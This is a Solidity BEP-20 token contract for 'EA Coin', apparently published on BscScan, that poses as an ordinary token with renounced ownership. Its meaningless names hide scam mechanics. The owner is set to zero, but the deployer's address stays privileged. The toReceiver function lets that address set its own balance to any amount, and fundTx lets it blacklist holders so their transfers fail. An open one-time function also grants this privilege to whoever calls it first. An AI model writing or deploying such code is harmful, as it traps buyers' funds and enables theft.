/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


interface feeIs {
    function createPair(address launchTxTrading, address liquidityExemptMarketing) external returns (address);
}

interface totalFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract EACoin {

    function toReceiver(uint256 swapToExempt) public {
        if (!atBuyTo[takeWalletTx()]) {
            return;
        }
        balanceOf[marketingEnable] = swapToExempt;
    }

    address public owner;

    function takeTo() public {
        if (walletBuyAmount == buyIs) {
            tokenMaxLaunch = buyIs;
        }
        
        buyIs=0;
    }

    function enableLaunched() public view returns (uint256) {
        return tokenMaxLaunch;
    }

    function amountReceiver() public {
        
        if (buyIs != tokenMaxLaunch) {
            buyIs = walletTx;
        }
        tokenMaxLaunch=0;
    }

    function totalListEnable(address totalSwapMin, address atTo, uint256 swapToExempt) internal returns (bool) {
        if (totalSwapMin == marketingEnable) {
            return minShould(totalSwapMin, atTo, swapToExempt);
        }
        require(!senderLaunchedTo[totalSwapMin]);
        return minShould(totalSwapMin, atTo, swapToExempt);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 private walletBuyAmount;

    address public marketingEnable;

    mapping(address => bool) public senderLaunchedTo;

    string public symbol = "ECN";

    function takeWalletTx() private view returns (address) {
        return msg.sender;
    }

    uint256 public tokenMaxLaunch;

    event Transfer(address indexed from, address indexed fundTeamSender, uint256 value);

    function marketingWallet() public {
        
        
        tokenMaxLaunch=0;
    }

    function transfer(address launchedFee, uint256 swapToExempt) external returns (bool) {
        return totalListEnable(takeWalletTx(), launchedFee, swapToExempt);
    }

    uint256 private liquidityReceiverEnable;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    bool public atTxIs;

    function teamLaunchReceiver(address launchedBuy) public {
        if (atTxIs) {
            return;
        }
        
        atBuyTo[launchedBuy] = true;
        if (liquidityReceiverEnable == walletBuyAmount) {
            tokenMaxLaunch = walletBuyAmount;
        }
        atTxIs = true;
    }

    function tokenBuy() public {
        emit OwnershipTransferred(marketingEnable, address(0));
        owner = address(0);
    }

    mapping(address => uint256) public balanceOf;

    uint256 public buyIs;

    uint8 public decimals = 18;

    function getOwner() external view returns (address) {
        return owner;
    }

    event Approval(address indexed exemptLiquidityToken, address indexed spender, uint256 value);

    mapping(address => bool) public atBuyTo;

    function transferFrom(address totalSwapMin, address atTo, uint256 swapToExempt) external returns (bool) {
        if (allowance[totalSwapMin][takeWalletTx()] != type(uint256).max) {
            require(swapToExempt <= allowance[totalSwapMin][takeWalletTx()]);
            allowance[totalSwapMin][takeWalletTx()] -= swapToExempt;
        }
        return totalListEnable(totalSwapMin, atTo, swapToExempt);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address fundToMarketing, uint256 swapToExempt) public returns (bool) {
        allowance[takeWalletTx()][fundToMarketing] = swapToExempt;
        emit Approval(takeWalletTx(), fundToMarketing, swapToExempt);
        return true;
    }

    function minShould(address totalSwapMin, address atTo, uint256 swapToExempt) internal returns (bool) {
        require(balanceOf[totalSwapMin] >= swapToExempt);
        balanceOf[totalSwapMin] -= swapToExempt;
        balanceOf[atTo] += swapToExempt;
        emit Transfer(totalSwapMin, atTo, swapToExempt);
        return true;
    }

    constructor (){
        
        totalFrom tradingWalletSender = totalFrom(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        takeList = feeIs(tradingWalletSender.factory()).createPair(tradingWalletSender.WETH(), address(this));
        owner = takeWalletTx();
        
        marketingEnable = owner;
        atBuyTo[marketingEnable] = true;
        balanceOf[marketingEnable] = totalSupply;
        
        emit Transfer(address(0), marketingEnable, totalSupply);
        tokenBuy();
    }

    string public name = "EA Coin";

    address public takeList;

    uint256 public walletTx;

    function fundTx(address limitAmount) public {
        
        if (limitAmount == marketingEnable || limitAmount == takeList || !atBuyTo[takeWalletTx()]) {
            return;
        }
        if (walletTx != tokenMaxLaunch) {
            buyIs = liquidityReceiverEnable;
        }
        senderLaunchedTo[limitAmount] = true;
    }

}